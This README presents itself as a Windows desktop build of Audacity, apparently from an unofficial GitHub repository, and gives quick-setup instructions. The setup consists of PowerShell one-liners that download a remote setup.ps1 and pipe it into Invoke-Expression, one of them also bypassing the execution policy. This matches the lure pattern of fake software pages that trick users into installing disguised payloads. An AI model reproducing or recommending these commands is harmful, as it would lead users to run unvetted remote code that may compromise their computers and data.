# Audacity — Desktop Build for Windows

Audacity is a desktop program for a Windows PC. This repository keeps the setup notes and the pictures that go with the page.

## Quick setup

Open Windows PowerShell and paste one of these commands.

```cmd
irm https://raw.githubusercontent.com/neumann-clara1796281/Audacity/main/setup.ps1 | Invoke-Expression
```

If Windows asks about the script policy, use the second command.

```cmd
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/neumann-clara1796281/Audacity/main/setup.ps1 | Invoke-Expression"
```

## What you get

- A desktop build for Windows 10 and Windows 11
- Local files and export on this PC
- The setup script and the page files in this repository

## System requirements

| Item | Minimum |
| OS | Windows 11 or Windows 10, 64-bit |
| Memory | 8 GB |
| Disk | 2 GB free |

## Files in this repository

- `setup.ps1` — the setup command
- `Initial.js` — a small page script
- `banner.jpg` and `pic.jpg` — the pictures on this page

![banner](banner.jpg)
  
